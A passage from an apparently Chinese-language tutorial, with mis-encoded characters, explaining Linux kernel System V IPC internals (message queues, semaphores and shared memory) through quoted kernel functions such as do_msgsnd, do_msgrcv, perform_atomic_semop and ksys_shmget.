0ï¼Œè¿”å›é˜Ÿåˆ—ä¸­æ¶ˆæ¯ç±»å‹å€¼å°äºæˆ–ç­‰äº type ç»å¯¹å€¼çš„æ¶ˆæ¯ï¼Œå¦‚æœæœ‰å¤šä¸ªï¼Œåˆ™å–ç±»å‹å€¼æœ€å°çš„æ¶ˆæ¯ã€‚ ä¸»è¦ç»“æ„ä½“ /* one msq_queue structure for each present queue on the system */ struct msg_queue { struct kern_ipc_perm q_perm; time64_t q_stime;\t/* last msgsnd time */ time64_t q_rtime;\t/* last msgrcv time */ time64_t q_ctime;\t/* last change time */ unsigned long q_cbytes;\t/* current number of bytes on queue */ unsigned long q_qnum;\t/* number of messages in queue */ unsigned long q_qbytes;\t/* max number of bytes on queue */ struct pid *q_lspid;\t/* pid of last msgsnd */ struct pid *q_lrpid;\t/* last receive pid */ struct list_head q_messages; struct list_head q_receivers; struct list_head q_senders; } __randomize_layout; /* one msg_receiver structure for each sleeping receiver */ struct msg_receiver { struct list_head\tr_list; struct task_struct\t*r_tsk; int\tr_mode; long\tr_msgtype; long\tr_maxsize; struct msg_msg\t*r_msg; }; /* one msg_sender for each sleeping sender */ struct msg_sender { struct list_head\tlist; struct task_struct\t*tsk; size_t msgsz; }; æ ¸å¿ƒå‡½æ•° msggetå‡½æ•°å®ç°è´Ÿè´£åˆ›å»ºæˆ–æ‰“å¼€æ¶ˆæ¯é˜Ÿåˆ—\nlong ksys_msgget(key_t key, int msgflg) { struct ipc_namespace *ns; static const struct ipc_ops msg_ops = { .getnew = newque, .associate = security_msg_queue_associate, }; struct ipc_params msg_params; ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; msg_params.key = key; msg_params.flg = msgflg; return ipcget(ns, \u0026amp;msg_ids(ns), \u0026amp;msg_ops, \u0026amp;msg_params); } msgsndå‡½æ•°å®é™…ç”±do_msgsndå‡½æ•°å®ç°ï¼Œè´Ÿè´£å¯¹æ¶ˆæ¯çš„å‘é€ã€‚\nstatic long do_msgsnd(int msqid, long mtype, void __user *mtext, size_t msgsz, int msgflg) { struct msg_queue *msq; struct msg_msg *msg; int err; struct ipc_namespace *ns; DEFINE_WAKE_Q(wake_q); ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; if (msgsz \u0026gt; ns-\u0026gt;msg_ctlmax || (long) msgsz \u0026lt; 0 || msqid \u0026lt; 0) return -EINVAL; if (mtype \u0026lt; 1) return -EINVAL; msg = load_msg(mtext, msgsz); if (IS_ERR(msg)) return PTR_ERR(msg); msg-\u0026gt;m_type = mtype; msg-\u0026gt;m_ts = msgsz; rcu_read_lock(); msq = msq_obtain_object_check(ns, msqid); if (IS_ERR(msq)) { err = PTR_ERR(msq); goto out_unlock1; } ipc_lock_object(\u0026amp;msq-\u0026gt;q_perm); for (;;) { struct msg_sender s; err = -EACCES; if (ipcperms(ns, \u0026amp;msq-\u0026gt;q_perm, S_IWUGO)) goto out_unlock0; /* raced with RMID? */ if (!ipc_valid_object(\u0026amp;msq-\u0026gt;q_perm)) { err = -EIDRM; goto out_unlock0; } err = security_msg_queue_msgsnd(\u0026amp;msq-\u0026gt;q_perm, msg, msgflg); if (err) goto out_unlock0; if (msg_fits_inqueue(msq, msgsz)) break; /* queue full, wait: */ if (msgflg \u0026amp; IPC_NOWAIT) { err = -EAGAIN; goto out_unlock0; } /* enqueue the sender and prepare to block */ ss_add(msq, \u0026amp;s, msgsz); if (!ipc_rcu_getref(\u0026amp;msq-\u0026gt;q_perm)) { err = -EIDRM; goto out_unlock0; } ipc_unlock_object(\u0026amp;msq-\u0026gt;q_perm); rcu_read_unlock(); schedule(); rcu_read_lock(); ipc_lock_object(\u0026amp;msq-\u0026gt;q_perm); ipc_rcu_putref(\u0026amp;msq-\u0026gt;q_perm, msg_rcu_free); /* raced with RMID? */ if (!ipc_valid_object(\u0026amp;msq-\u0026gt;q_perm)) { err = -EIDRM; goto out_unlock0; } ss_del(\u0026amp;s); if (signal_pending(current)) { err = -ERESTARTNOHAND; goto out_unlock0; } } ipc_update_pid(\u0026amp;msq-\u0026gt;q_lspid, task_tgid(current)); msq-\u0026gt;q_stime = ktime_get_real_seconds(); if (!pipelined_send(msq, msg, \u0026amp;wake_q)) { /* no one is waiting for this message, enqueue it */ list_add_tail(\u0026amp;msg-\u0026gt;m_list, \u0026amp;msq-\u0026gt;q_messages); msq-\u0026gt;q_cbytes += msgsz; msq-\u0026gt;q_qnum++; percpu_counter_add_local(\u0026amp;ns-\u0026gt;percpu_msg_bytes, msgsz); percpu_counter_add_local(\u0026amp;ns-\u0026gt;percpu_msg_hdrs, 1); } err = 0; msg = NULL; out_unlock0: ipc_unlock_object(\u0026amp;msq-\u0026gt;q_perm); wake_up_q(\u0026amp;wake_q); out_unlock1: rcu_read_unlock(); if (msg != NULL) free_msg(msg); return err; } msgrcvå‡½æ•°å®é™…ç”±do_msgrcvå‡½æ•°å®ç°ï¼Œå®ç°å¯¹æ¶ˆæ¯çš„æ¥æ”¶ã€‚\nstatic long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg, long (*msg_handler)(void __user *, struct msg_msg *, size_t)) { int mode; struct msg_queue *msq; struct ipc_namespace *ns; struct msg_msg *msg, *copy = NULL; DEFINE_WAKE_Q(wake_q); ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; if (msqid \u0026lt; 0 || (long) bufsz \u0026lt; 0) return -EINVAL; if (msgflg \u0026amp; MSG_COPY) { if ((msgflg \u0026amp; MSG_EXCEPT) || !(msgflg \u0026amp; IPC_NOWAIT)) return -EINVAL; copy = prepare_copy(buf, min_t(size_t, bufsz, ns-\u0026gt;msg_ctlmax)); if (IS_ERR(copy)) return PTR_ERR(copy); } mode = convert_mode(\u0026amp;msgtyp, msgflg); rcu_read_lock(); msq = msq_obtain_object_check(ns, msqid); if (IS_ERR(msq)) { rcu_read_unlock(); free_copy(copy); return PTR_ERR(msq); } for (;;) { struct msg_receiver msr_d; msg = ERR_PTR(-EACCES); if (ipcperms(ns, \u0026amp;msq-\u0026gt;q_perm, S_IRUGO)) goto out_unlock1; ipc_lock_object(\u0026amp;msq-\u0026gt;q_perm); /* raced with RMID? */ if (!ipc_valid_object(\u0026amp;msq-\u0026gt;q_perm)) { msg = ERR_PTR(-EIDRM); goto out_unlock0; } msg = find_msg(msq, \u0026amp;msgtyp, mode); if (!IS_ERR(msg)) { /* * Found a suitable message. * Unlink it from the queue. */ if ((bufsz \u0026lt; msg-\u0026gt;m_ts) \u0026amp;\u0026amp; !(msgflg \u0026amp; MSG_NOERROR)) { msg = ERR_PTR(-E2BIG); goto out_unlock0; } /* * If we are copying, then do not unlink message and do * not update queue parameters. */ if (msgflg \u0026amp; MSG_COPY) { msg = copy_msg(msg, copy); goto out_unlock0; } list_del(\u0026amp;msg-\u0026gt;m_list); msq-\u0026gt;q_qnum--; msq-\u0026gt;q_rtime = ktime_get_real_seconds(); ipc_update_pid(\u0026amp;msq-\u0026gt;q_lrpid, task_tgid(current)); msq-\u0026gt;q_cbytes -= msg-\u0026gt;m_ts; percpu_counter_sub_local(\u0026amp;ns-\u0026gt;percpu_msg_bytes, msg-\u0026gt;m_ts); percpu_counter_sub_local(\u0026amp;ns-\u0026gt;percpu_msg_hdrs, 1); ss_wakeup(msq, \u0026amp;wake_q, false); goto out_unlock0; } /* No message waiting. Wait for a message */ if (msgflg \u0026amp; IPC_NOWAIT) { msg = ERR_PTR(-ENOMSG); goto out_unlock0; } list_add_tail(\u0026amp;msr_d.r_list, \u0026amp;msq-\u0026gt;q_receivers); msr_d.r_tsk = current; msr_d.r_msgtype = msgtyp; msr_d.r_mode = mode; if (msgflg \u0026amp; MSG_NOERROR) msr_d.r_maxsize = INT_MAX; else msr_d.r_maxsize = bufsz; /* memory barrier not require due to ipc_lock_object() */ WRITE_ONCE(msr_d.r_msg, ERR_PTR(-EAGAIN)); /* memory barrier not required, we own ipc_lock_object() */ __set_current_state(TASK_INTERRUPTIBLE); ipc_unlock_object(\u0026amp;msq-\u0026gt;q_perm); rcu_read_unlock(); schedule(); /* * Lockless receive, part 1: * We don\u0026#39;t hold a reference to the queue and getting a * reference would defeat the idea of a lockless operation, * thus the code relies on rcu to guarantee the existence of * msq: * Prior to destruction, expunge_all(-EIRDM) changes r_msg. * Thus if r_msg is -EAGAIN, then the queue not yet destroyed. */ rcu_read_lock(); /* * Lockless receive, part 2: * The work in pipelined_send() and expunge_all(): * - Set pointer to message * - Queue the receiver task for later wakeup * - Wake up the process after the lock is dropped. * * Should the process wake up before this wakeup (due to a * signal) it will either see the message and continue ... */ msg = READ_ONCE(msr_d.r_msg); if (msg != ERR_PTR(-EAGAIN)) { /* see MSG_BARRIER for purpose/pairing */ smp_acquire__after_ctrl_dep(); goto out_unlock1; } /* * ... or see -EAGAIN, acquire the lock to check the message * again. */ ipc_lock_object(\u0026amp;msq-\u0026gt;q_perm); msg = READ_ONCE(msr_d.r_msg); if (msg != ERR_PTR(-EAGAIN)) goto out_unlock0; list_del(\u0026amp;msr_d.r_list); if (signal_pending(current)) { msg = ERR_PTR(-ERESTARTNOHAND); goto out_unlock0; } ipc_unlock_object(\u0026amp;msq-\u0026gt;q_perm); } out_unlock0: ipc_unlock_object(\u0026amp;msq-\u0026gt;q_perm); wake_up_q(\u0026amp;wake_q); out_unlock1: rcu_read_unlock(); if (IS_ERR(msg)) { free_copy(copy); return PTR_ERR(msg); } bufsz = msg_handler(buf, msg, bufsz); free_msg(msg); return bufsz; } long ksys_msgrcv(int msqid, struct msgbuf __user *msgp, size_t msgsz, long msgtyp, int msgflg) { return do_msgrcv(msqid, msgp, msgsz, msgtyp, msgflg, do_msg_fill); } ksys_msgctlå‡½æ•°è´Ÿè´£æ§åˆ¶æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ ¹æ®å…·ä½“cmdé€‰æ‹©ä¸åŒçš„æ“ä½œã€‚\nstatic long ksys_msgctl(int msqid, int cmd, struct msqid_ds __user *buf, int version) { struct ipc_namespace *ns; struct msqid64_ds msqid64; int err; if (msqid \u0026lt; 0 || cmd \u0026lt; 0) return -EINVAL; ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; switch (cmd) { case IPC_INFO: case MSG_INFO: { struct msginfo msginfo; err = msgctl_info(ns, msqid, cmd, \u0026amp;msginfo); if (err \u0026lt; 0) return err; if (copy_to_user(buf, \u0026amp;msginfo, sizeof(struct msginfo))) err = -EFAULT; return err; } case MSG_STAT:\t/* msqid is an index rather than a msg queue id */ case MSG_STAT_ANY: case IPC_STAT: err = msgctl_stat(ns, msqid, cmd, \u0026amp;msqid64); if (err \u0026lt; 0) return err; if (copy_msqid_to_user(buf, \u0026amp;msqid64, version)) err = -EFAULT; return err; case IPC_SET: if (copy_msqid_from_user(\u0026amp;msqid64, buf, version)) return -EFAULT; return msgctl_down(ns, msqid, cmd, \u0026amp;msqid64.msg_perm, msqid64.msg_qbytes); case IPC_RMID: return msgctl_down(ns, msqid, cmd, NULL, 0); default: return -EINVAL; } } ä¿¡å·é‡ **ä¿¡å·é‡ï¼ˆsemaphoreï¼‰**ä¸å·²ç»ä»‹ç»è¿‡çš„ IPC ç»“æ„ä¸åŒï¼Œå®ƒæ˜¯ä¸€ä¸ªè®¡æ•°å™¨ã€‚ä¿¡å·é‡ç”¨äºå®ç°è¿›ç¨‹é—´çš„äº’æ–¥ä¸åŒæ­¥ï¼Œè€Œä¸æ˜¯ç”¨äºå­˜å‚¨è¿›ç¨‹é—´é€šä¿¡æ•°æ®ã€‚\nç‰¹ç‚¹ ä¿¡å·é‡ç”¨äºè¿›ç¨‹é—´åŒæ­¥ï¼Œè‹¥è¦åœ¨è¿›ç¨‹é—´ä¼ é€’æ•°æ®éœ€è¦ç»“åˆå…±äº«å†…å­˜ã€‚ ä¿¡å·é‡åŸºäºæ“ä½œç³»ç»Ÿçš„ PV æ“ä½œï¼Œç¨‹åºå¯¹ä¿¡å·é‡çš„æ“ä½œéƒ½æ˜¯åŸå­æ“ä½œã€‚ æ¯æ¬¡å¯¹ä¿¡å·é‡çš„ PV æ“ä½œä¸ä»…é™äºå¯¹ä¿¡å·é‡å€¼åŠ  1 æˆ–å‡ 1ï¼Œè€Œä¸”å¯ä»¥åŠ å‡ä»»æ„æ­£æ•´æ•°ã€‚ æ”¯æŒä¿¡å·é‡ç»„ã€‚ ç»“æ„ä½“ æœ€ç®€å•çš„ä¿¡å·é‡æ˜¯åªèƒ½å– 0 å’Œ 1 çš„å˜é‡ï¼Œè¿™ä¹Ÿæ˜¯ä¿¡å·é‡æœ€å¸¸è§çš„ä¸€ç§å½¢å¼ï¼Œå«åšäºŒå€¼ä¿¡å·é‡ï¼ˆBinary Semaphoreï¼‰ã€‚è€Œå¯ä»¥å–å¤šä¸ªæ­£æ•´æ•°çš„ä¿¡å·é‡è¢«ç§°ä¸ºé€šç”¨ä¿¡å·é‡ã€‚\n/* One semaphore structure for each semaphore in the system. */ struct sem { int\tsemval;\t/* current value */ /* * PID of the process that last modified the semaphore. For * Linux, specifically these are: * - semop * - semctl, via SETVAL and SETALL. * - at task exit when performing undo adjustments (see exit_sem). */ struct pid *sempid; spinlock_t\tlock;\t/* spinlock for fine-grained semtimedop */ struct list_head pending_alter; /* pending single-sop operations */ /* that alter the semaphore */ struct list_head pending_const; /* pending single-sop operations */ /* that do not alter the semaphore*/ time64_t\tsem_otime;\t/* candidate for sem_otime */ } ____cacheline_aligned_in_smp; /* One sem_array data structure for each set of semaphores in the system. */ struct sem_array { struct kern_ipc_perm\tsem_perm;\t/* permissions .. see ipc.h */ time64_t\tsem_ctime;\t/* create/last semctl() time */ struct list_head\tpending_alter;\t/* pending operations */ /* that alter the array */ struct list_head\tpending_const;\t/* pending complex operations */ /* that do not alter semvals */ struct list_head\tlist_id;\t/* undo requests on this array */ int\tsem_nsems;\t/* no. of semaphores in array */ int\tcomplex_count;\t/* pending complex operations */ unsigned int\tuse_global_lock;/* \u0026gt;0: global lock required */ struct sem\tsems[]; } __randomize_layout; æ ¸å¿ƒå‡½æ•° semgetå‡½æ•°\nlong ksys_semget(key_t key, int nsems, int semflg) { struct ipc_namespace *ns; static const struct ipc_ops sem_ops = { .getnew = newary, .associate = security_sem_associate, .more_checks = sem_more_checks, }; struct ipc_params sem_params; ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; if (nsems \u0026lt; 0 || nsems \u0026gt; ns-\u0026gt;sc_semmsl) return -EINVAL; sem_params.key = key; sem_params.flg = semflg; sem_params.u.nsems = nsems; return ipcget(ns, \u0026amp;sem_ids(ns), \u0026amp;sem_ops, \u0026amp;sem_params); } perform_atomic_semopå‡½æ•°ï¼Œå°è¯•åœ¨ç»™å®šçš„æ•°ç»„ä¸Šè¿›è¡Œä¿¡å·é‡æ“ä½œï¼ˆPVæ“ä½œï¼‰ï¼Œéå†ä¸¤æ¬¡é˜Ÿåˆ—ç¡®ä¿æ•´ä¸ªæ“ä½œé¡ºåˆ©å®Œæˆã€‚\n/** * perform_atomic_semop[_slow] - Attempt to perform semaphore * operations on a given array. * @sma: semaphore array * @q: struct sem_queue that describes the operation * * Caller blocking are as follows, based the value * indicated by the semaphore operation (sem_op): * * (1) \u0026gt;0 never blocks. * (2) 0 (wait-for-zero operation): semval is non-zero. * (3) \u0026lt;0 attempting to decrement semval to a value smaller than zero. * * Returns 0 if the operation was possible. * Returns 1 if the operation is impossible, the caller must sleep. * Returns \u0026lt;0 for error codes. */ static int perform_atomic_semop(struct sem_array *sma, struct sem_queue *q) { int result, sem_op, nsops; struct sembuf *sop; struct sem *curr; struct sembuf *sops; struct sem_undo *un; sops = q-\u0026gt;sops; nsops = q-\u0026gt;nsops; un = q-\u0026gt;undo; if (unlikely(q-\u0026gt;dupsop)) return perform_atomic_semop_slow(sma, q); /* * We scan the semaphore set twice, first to ensure that the entire * operation can succeed, therefore avoiding any pointless writes * to shared memory and having to undo such changes in order to block * until the operations can go through. */ for (sop = sops; sop \u0026lt; sops + nsops; sop++) { int idx = array_index_nospec(sop-\u0026gt;sem_num, sma-\u0026gt;sem_nsems); curr = \u0026amp;sma-\u0026gt;sems[idx]; sem_op = sop-\u0026gt;sem_op; result = curr-\u0026gt;semval; if (!sem_op \u0026amp;\u0026amp; result) goto would_block; /* wait-for-zero */ result += sem_op; if (result \u0026lt; 0) goto would_block; if (result \u0026gt; SEMVMX) return -ERANGE; if (sop-\u0026gt;sem_flg \u0026amp; SEM_UNDO) { int undo = un-\u0026gt;semadj[sop-\u0026gt;sem_num] - sem_op; /* Exceeding the undo range is an error. */ if (undo \u0026lt; (-SEMAEM - 1) || undo \u0026gt; SEMAEM) return -ERANGE; } } for (sop = sops; sop \u0026lt; sops + nsops; sop++) { curr = \u0026amp;sma-\u0026gt;sems[sop-\u0026gt;sem_num]; sem_op = sop-\u0026gt;sem_op; if (sop-\u0026gt;sem_flg \u0026amp; SEM_UNDO) { int undo = un-\u0026gt;semadj[sop-\u0026gt;sem_num] - sem_op; un-\u0026gt;semadj[sop-\u0026gt;sem_num] = undo; } curr-\u0026gt;semval += sem_op; ipc_update_pid(\u0026amp;curr-\u0026gt;sempid, q-\u0026gt;pid); } return 0; would_block: q-\u0026gt;blocking = sop; return sop-\u0026gt;sem_flg \u0026amp; IPC_NOWAIT ? -EAGAIN : 1; } ksys_semctlå‡½æ•°ï¼Œè¯¥å‡½æ•°ç”¨æ¥æ§åˆ¶ä¿¡å·é‡ï¼Œå®ƒä¸å…±äº«å†…å­˜çš„shmctlå‡½æ•°å’Œæ¶ˆæ¯é˜Ÿåˆ—çš„msgctlç›¸ä¼¼\nstatic long ksys_semctl(int semid, int semnum, int cmd, unsigned long arg, int version) { struct ipc_namespace *ns; void __user *p = (void __user *)arg; struct semid64_ds semid64; int err; if (semid \u0026lt; 0) return -EINVAL; ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; switch (cmd) { case IPC_INFO: case SEM_INFO: return semctl_info(ns, semid, cmd, p); case IPC_STAT: case SEM_STAT: case SEM_STAT_ANY: err = semctl_stat(ns, semid, cmd, \u0026amp;semid64); if (err \u0026lt; 0) return err; if (copy_semid_to_user(p, \u0026amp;semid64, version)) err = -EFAULT; return err; case GETALL: case GETVAL: case GETPID: case GETNCNT: case GETZCNT: case SETALL: return semctl_main(ns, semid, semnum, cmd, p); case SETVAL: { int val; #if defined(CONFIG_64BIT) \u0026amp;\u0026amp; defined(__BIG_ENDIAN) /* big-endian 64bit */ val = arg \u0026gt;\u0026gt; 32; #else /* 32bit or little-endian 64bit */ val = arg; #endif return semctl_setval(ns, semid, semnum, val); } case IPC_SET: if (copy_semid_from_user(\u0026amp;semid64, p, version)) return -EFAULT; fallthrough; case IPC_RMID: return semctl_down(ns, semid, cmd, \u0026amp;semid64); default: return -EINVAL; } } å…±äº«å†…å­˜ å…±äº«å†…å­˜ï¼ˆShared Memoryï¼‰ï¼ŒæŒ‡ä¸¤ä¸ªæˆ–å¤šä¸ªè¿›ç¨‹å…±äº«ä¸€ä¸ªç»™å®šçš„å­˜å‚¨åŒºã€‚\nç‰¹ç‚¹ å…±äº«å†…å­˜æ˜¯æœ€å¿«çš„ä¸€ç§ IPCï¼Œå› ä¸ºè¿›ç¨‹æ˜¯ç›´æ¥å¯¹å†…å­˜è¿›è¡Œå­˜å–ã€‚ å…±äº«å†…å­˜æ“ä½œé»˜è®¤ä¸é˜»å¡ï¼Œå¦‚æœå¤šä¸ªè¿›ç¨‹åŒæ—¶è¯»å†™å…±äº«å†…å­˜ï¼Œå¯èƒ½å‡ºç°æ•°æ®æ··ä¹±ï¼Œå…±äº«å†…å­˜éœ€è¦å€ŸåŠ©å…¶ä»–æœºåˆ¶æ¥ä¿è¯è¿›ç¨‹é—´çš„æ•°æ®åŒæ­¥ï¼Œæ¯”å¦‚ï¼šä¿¡å·é‡ï¼Œå…±äº«å†…å­˜å†…éƒ¨æ²¡æœ‰æä¾›è¿™ç§æœºåˆ¶ã€‚ æ ¸å¿ƒå‡½æ•° åˆ›å»ºå…±äº«å†…å­˜æ®µ (shmget)ï¼š shmget ç³»ç»Ÿè°ƒç”¨åˆ›å»ºæ–°çš„å…±äº«å†…å­˜æ®µï¼Œåˆ†é…å¯¹åº”çš„ç‰©ç†å†…å­˜ï¼Œå¹¶åˆå§‹åŒ–ç›¸å…³çš„ç»“æ„ä½“ä¿¡æ¯ã€‚ é™„åŠ å…±äº«å†…å­˜æ®µ (shmat)ï¼š shmat ç³»ç»Ÿè°ƒç”¨å°†å…±äº«å†…å­˜æ®µæ˜ å°„åˆ°è°ƒç”¨è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­ï¼Œæ›´æ–°é™„åŠ è®¡æ•°å’Œæ—¶é—´æˆ³ã€‚ åˆ†ç¦»å…±äº«å†…å­˜æ®µ (shmdt)ï¼š shmdt ç³»ç»Ÿè°ƒç”¨å°†å…±äº«å†…å­˜æ®µä»è°ƒç”¨è¿›ç¨‹çš„åœ°å€ç©ºé—´ä¸­è§£é™¤æ˜ å°„ï¼Œæ›´æ–°é™„åŠ è®¡æ•°å’Œæ—¶é—´æˆ³ã€‚ æ§åˆ¶å…±äº«å†…å­˜æ®µ (shmctl)ï¼š shmctl ç³»ç»Ÿè°ƒç”¨ç”¨äºæ§åˆ¶å…±äº«å†…å­˜æ®µï¼Œä¾‹å¦‚è®¾ç½®æƒé™ã€åˆ é™¤å…±äº«å†…å­˜æ®µç­‰ã€‚ ä¸»è¦ç»“æ„ä½“ ç»“æ„ä½“ shmid_kernel\nå…±äº«å†…å­˜æ®µåœ¨å†…æ ¸ä¸­ä½¿ç”¨ shmid_kernel ç»“æ„ä½“è¡¨ç¤ºï¼Œè¯¥ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š\nstruct shmid_kernel { struct kern_ipc_perm shm_perm; /* æƒé™ç»“æ„ä½“ */ struct file *shm_file; /* å¯¹åº”çš„æ–‡ä»¶ */ size_t shm_segsz; /* æ®µå¤§å° */ struct user_struct *shm_creator; /* åˆ›å»ºè€… */ struct user_struct *shm_last_attach; /* æœ€åä¸€æ¬¡é™„åŠ çš„ç”¨æˆ· */ struct work_struct shm_rmid_work; /* åˆ é™¤å·¥ä½œ */ int shm_nattch; /* å½“å‰é™„åŠ çš„è¿›ç¨‹æ•° */ time64_t shm_atim; /* æœ€åé™„åŠ æ—¶é—´ */ time64_t shm_dtim; /* æœ€ååˆ†ç¦»æ—¶é—´ */ time64_t shm_ctim; /* æœ€åæ”¹å˜æ—¶é—´ */ pid_t shm_cprid; /* åˆ›å»ºè€… PID */ pid_t shm_lprid; /* æœ€åé™„åŠ æˆ–åˆ†ç¦»çš„ PID */ }; è¯¦ç»†åˆ†æ å®é™…æºç ä¸­çš„å‡½æ•°åéœ€è¦åŠ ä¸Šksys_å‰ç¼€ï¼ŒåŸå› å¤§æ¦‚æ˜¯ä¸ºäº†åŒºåˆ†å†…æ ¸å†…éƒ¨è°ƒç”¨å’Œç”¨æˆ·ç©ºé—´æ¥å£ï¼Œksys_shmgetå‡½æ•°å°è£…çš„ä¸€å±‚åå˜æˆäº†shmgetå‡½æ•°ã€‚\nä½¿ç”¨ ksys_ å‰ç¼€å¯ä»¥æ¸…æ¥šåœ°å°†å†…æ ¸å†…éƒ¨å‡½æ•°ä¸ç”¨æˆ·ç©ºé—´ç³»ç»Ÿè°ƒç”¨æ¥å£åŒºåˆ†å¼€æ¥ã€‚ç”¨æˆ·ç©ºé—´ç¨‹åºè°ƒç”¨çš„æ˜¯æ— å‰ç¼€çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆä¾‹å¦‚ sys_openï¼‰ï¼Œè€Œå†…æ ¸å†…éƒ¨æ¨¡å—æˆ–å‡½æ•°è°ƒç”¨çš„æ˜¯ ksys_openã€‚\nSYSCALL_DEFINE3(shmget, key_t, key, size_t, size, int, shmflg) { return ksys_shmget(key, size, shmflg); } 1ã€å…±äº«å†…å­˜çš„åˆ›å»º\nåˆ›å»ºå…±äº«å†…å­˜æ®µçš„ä¸»è¦å‡½æ•°æ˜¯ shmgetã€‚\nå®é™…è°ƒç”¨çš„å‡½æ•°æ˜¯ipcget()ã€‚å…±äº«å†…å­˜ã€ä¿¡å·é‡ã€æ¶ˆæ¯é˜Ÿåˆ—ä¸‰ç§å¯¹è±¡åˆ›å»ºçš„æ—¶å€™éƒ½ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚\nlong ksys_shmget(key_t key, size_t size, int shmflg) { struct ipc_namespace *ns; static const struct ipc_ops shm_ops = { .getnew = newseg, .associate = security_shm_associate, .more_checks = shm_more_checks, }; struct ipc_params shm_params; ns = current-\u0026gt;nsproxy-\u0026gt;ipc_ns; shm_params.key = key; shm_params.flg = shmflg; shm_params.u.size = size; return ipcget(ns, \u0026amp;shm_ids(ns), \u0026amp;shm_ops, \u0026amp;shm_params); } å‚æ•°:\nkey: ç±»å‹ key_t æ˜¯ä¸ªæ•´å½¢æ•°ï¼Œé€šè¿‡è¿™ä¸ªkeyå¯ä»¥åˆ›å»ºæˆ–è€…æ‰“å¼€ä¸€å—å…±äº«å†…å­˜ï¼Œè¯¥å‚æ•°çš„å€¼ä¸€å®šè¦å¤§äº0\nsize: åˆ›å»ºå…±äº«å†…å­˜çš„æ—¶å€™ï¼ŒæŒ‡å®šå…±äº«å†…å­˜çš„å¤§å°ï¼Œå¦‚æœæ˜¯æ‰“å¼€ä¸€å—å­˜åœ¨çš„å…±äº«å†…å­˜ï¼Œsize æ˜¯æ²¡æœ‰æ„ä¹‰çš„\nshmflgï¼šåˆ›å»ºå…±äº«å†…å­˜çš„æ—¶å€™æŒ‡å®šçš„å±æ€§\nIPC_CREAT: åˆ›å»ºæ–°çš„å…±äº«å†…å­˜ï¼Œå¦‚æœåˆ›å»ºå…±äº«å†…å­˜ï¼Œéœ€è¦æŒ‡å®šå¯¹å…±äº«å†…å­˜çš„æ“ä½œæƒé™ï¼Œæ¯”å¦‚ï¼šIPC_CREAT | 0664 IPC_EXCL: æ£€æµ‹å…±äº«å†…å­˜æ˜¯å¦å·²ç»å­˜åœ¨äº†ï¼Œå¿…é¡»å’Œ IPC_CREAT ä¸€èµ·ä½¿ç”¨ è¿”å›å€¼ï¼šå…±äº«å†…å­˜åˆ›å»ºæˆ–è€…æ‰“å¼€æˆåŠŸè¿”å›æ ‡è¯†å…±äº«å†…å­˜çš„å”¯ä¸€çš„ IDï¼Œå¤±è´¥è¿”å› - 1.\næˆ‘ä»¬å›å¤´æ¥çœ‹çœ‹shmget()ç©¶ç«Ÿå¹²äº†å•¥ï¼Œé¦–å…ˆçœ‹ä¸€ä¸‹ipcget()\nint ipcget(struct ipc_namespace *ns, struct ipc_ids *ids, const struct ipc_ops *ops, struct ipc_params *params) { if (params-\u0026gt;key == IPC_PRIVATE) return ipcget_new(ns, ids, ops, params); else return ipcget_public(ns, ids, ops, params); } å¦‚æœä¼ è¿›æ¥çš„å‚æ•°æ˜¯IPC_PRIVATEï¼ˆè¿™ä¸ªå®çš„å€¼æ˜¯0ï¼‰çš„è¯ï¼Œæ— è®ºæ˜¯ä»€ä¹ˆmodeï¼Œéƒ½ä¼šåˆ›å»ºä¸€å—æ–°çš„å…±äº«å†…å­˜ã€‚å¦‚æœé0ï¼Œåˆ™ä¼šå»å·²æœ‰çš„å…±äº«å†…å­˜ä¸­æ‰¾æœ‰æ²¡æœ‰è¿™ä¸ªkeyçš„ï¼Œæœ‰å°±è¿”å›ï¼Œæ²¡æœ‰å°±æ–°å»ºã€‚\n2ã€å…±äº«å†…å­˜çš„å…³è”\nå…³è”å…±äº«å†…å­˜æ®µçš„ä¸»è¦å‡½æ•°æ˜¯ shmatï¼Œå®ƒçš„é€»è¾‘å…¨åœ¨do_shmat()ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥çœ‹è¿™ä¸ªå‡½æ•°ã€‚\né¦–å…ˆæ£€æŸ¥shmaddrçš„åˆæ³•æ€§å¹¶è¿›è¡Œå¯¹é½ï¼Œå³è°ƒæ•´ä¸ºshmlbaçš„æ•´æ•°å€ã€‚å¦‚æœä¼ å…¥addræ˜¯0ï¼Œå‰é¢æ£€æŸ¥éƒ¨åˆ†åªä¼šåŠ ä¸Šä¸€ä¸ªMAP_SHAREDæ ‡å¿—ï¼Œå› ä¸ºåé¢çš„mmapä¼šè‡ªåŠ¨ä¸ºå…¶åˆ†é…åœ°å€ã€‚ç„¶åä»é‚£ä¸€æ®µä¸¤è¡Œçš„æ³¨é‡Šå¼€å§‹ï¼Œå‡½æ•°é€šè¿‡shmidå°è¯•è·å–å…±äº«å†…å­˜å¯¹è±¡ï¼Œå¹¶è¿›è¡Œæƒé™æ£€æŸ¥ã€‚ç„¶åä¿®æ”¹shpä¸­çš„ä¸€äº›æ•°æ®ï¼Œæ¯”å¦‚è¿æ¥è¿›ç¨‹æ•°åŠ ä¸€ã€‚ç„¶åæ˜¯é€šè¿‡alloc_file_clone()åˆ›å»ºçœŸæ­£çš„è¦åšmmapçš„fileã€‚åœ¨mmapä¹‹å‰è¿˜è¦å¯¹åœ°å€ç©ºé—´è¿›è¡Œæ£€æŸ¥ï¼Œæ£€æŸ¥æ˜¯å¦å’Œåˆ«çš„åœ°å€é‡å ï¼Œæ˜¯å¦å¤Ÿç”¨ã€‚å®é™…çš„æ˜ å°„å·¥ä½œå°±åœ¨do_mmap()å‡½æ•°ä¸­åšäº†ã€‚\nlong do_shmat(int shmid, char __user *shmaddr, int shmflg, ulong *raddr, unsigned long shmlba) { struct shmid_kernel *shp; unsigned long addr = (unsigned long)shmaddr; unsigned long size; struct file *file, *base; int err; unsigned long flags = MAP_SHARED; unsigned long prot; int acc_mode; struct 